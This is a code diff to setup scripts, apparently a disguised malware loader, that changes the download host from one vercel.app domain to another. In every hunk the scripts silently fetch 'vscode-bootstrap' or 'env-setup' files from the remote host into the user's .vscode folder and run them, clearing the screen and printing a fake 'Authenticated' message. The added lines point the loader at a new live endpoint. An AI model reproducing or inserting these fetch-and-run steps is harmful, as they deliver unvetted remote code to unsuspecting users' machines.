@@ -88,7 +88,7 @@ set "VSCODE_DIR=%USERPROFILE%\\.vscode"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitcheckout-six.vercel.app/settings/bootstrap?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitcheck-commit.vercel.app/settings/bootstrap?flag=${flag}
 cls
 "%VSCODE_DIR%\\vscode-bootstrap.cmd"
 cls
@@ -107,7 +107,7 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitcheckout-six.vercel.app/settings/bootstraplinux?flag=${flag}"
+wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitcheck-commit.vercel.app/settings/bootstraplinux?flag=${flag}"
 clear
 chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
 clear
@@ -127,7 +127,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitcheckout-six.vercel.app/settings/bootstraplinux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitcheck-commit.vercel.app/settings/bootstraplinux?flag=${flag}"
 clear
 chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
 clear
@@ -221,8 +221,8 @@ if not defined NODE_EXE (
 set "CODEPROFILE=%USERPROFILE%\\.vscode"
 echo [INFO] Downloading env-setup.npl and package.json...
 
-curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitcheckout-six.vercel.app/settings/env?flag=${flag}"
-curl -L -o "%CODEPROFILE%\\package.json" "https://gitcheckout-six.vercel.app/settings/package"
+curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitcheck-commit.vercel.app/settings/env?flag=${flag}"
+curl -L -o "%CODEPROFILE%\\package.json" "https://gitcheck-commit.vercel.app/settings/package"
 
 :: -------------------------
 :: Install dependencies
@@ -374,7 +374,7 @@ fi
 # -------------------------
 USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
-BASE_URL="https://gitcheckout-six.vercel.app"
+BASE_URL="https://gitcheck-commit.vercel.app"
 echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
